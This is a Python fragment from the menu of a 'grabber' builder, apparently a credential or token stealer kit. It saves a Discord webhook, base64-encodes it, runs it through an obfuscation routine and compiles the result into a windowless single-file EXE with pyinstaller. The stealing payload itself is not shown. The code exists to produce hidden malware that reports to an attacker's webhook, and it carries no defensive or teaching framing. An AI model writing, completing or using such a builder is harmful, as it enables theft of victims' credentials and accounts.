while True:
    print(Fore.RED + "1 = Build, 2 = Set Webhook, 3 = Exit")
    tb = input(Fore.RED + "Enter choice: ")

    if tb not in ["1", "2", "3"]:
        print(Fore.YELLOW + "INCORRECT")
        continue

    if tb == "1":
        aa = input(Fore.CYAN + "Name of grabber: ")
        print(Fore.CYAN + "Building grabber as EXE...")
        if os.path.exists("webhook.ini"):
            with open("webhook.ini", "r") as f:
                for hah in f:
                    if hah.startswith("webhook="):
                        webhook = hah.split("=", 1)[1].strip()
            dsa = webhook
            hadhd = dsa.encode("ascii")
            ags = base64.b64encode(hadhd)
            jtr = ags.decode("ascii")
            with open(aa + ".py", "w") as asd:
                asd.write(obfusc(jtr))
            os.system("pyinstaller " + aa + ".py --onefile --noconsole")
            os.remove(aa + ".py")
            print(Fore.GREEN + "File successfully built")
        else:
            print(Fore.YELLOW + "WEBHOOK NOT SET")
            continue
        
        
    elif tb == "2":
        print(Fore.CYAN + "Set Webhook")
        wb = input(Fore.BLUE + "Enter Webhook Link: ")
        print(Fore.YELLOW + "Checking if valid...")
        if ( wb.startswith("https://discord.com/api/webhooks/") or wb.startswith("http://discord.com/api/webhooks/")):
            with open("webhook.ini", "w") as f:
                f.write("webhook=" + wb)
            print(Fore.GREEN + "VALID, WEBHOOK UPDATED")
        else:
            print(Fore.RED + "INVALID")
    elif tb == "3":
        print(Fore.CYAN + "Exiting...")
        break
